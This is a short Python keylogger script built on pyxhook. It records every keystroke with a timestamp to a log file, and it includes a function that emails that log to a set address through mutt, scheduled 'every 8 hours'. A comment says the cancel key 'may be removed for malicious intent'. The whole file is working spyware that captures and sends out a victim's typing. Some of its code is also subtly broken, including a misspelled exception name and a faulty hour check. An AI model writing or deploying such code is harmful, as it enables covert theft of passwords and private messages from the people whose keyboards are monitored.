import os
import pyxhook
import datetime

pathName = '/home/file.log'
emailRecipient = "recipient@domain.com"

#log file save location
log_file = os.environ.get('psylogger_file',pathName)


#cancel key for the keylogger, may be removed for malicious intent
cancel_key = ord(os.environ.get( 'pylogger_cancel',  '`')[0] )

# Allow clearing the log file on start, if pylogger_clean is defined.
if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(log_file)
    except EnviornmentError:
        pass

def OnKeyPress(event):
    with open(log_file, 'a') as f:
        f.write('{} : {}\n'.format(datetime.datetime.now(), event.Key))

def mailLog():
    os.system("echo 'This is the message body' | mutt -a '{}' -s 'subject of message' -- {}".format(pathName,emailRecipient))



new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress

new_hook.HookKeyboard()
try:
    new_hook.start()         # start the hook
except KeyboardInterrupt:
    # User cancelled from command line.
    pass
except Exception as ex:
    # Write exceptions to the log file, for analysis later.
    msg = 'Error while catching events:\n  {}'.format(ex)
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
        f.write('\n{}'.format(msg))

#send email every 8 hours
if (datetime.datetime.hour%8 ==0 ):
    mailLog()

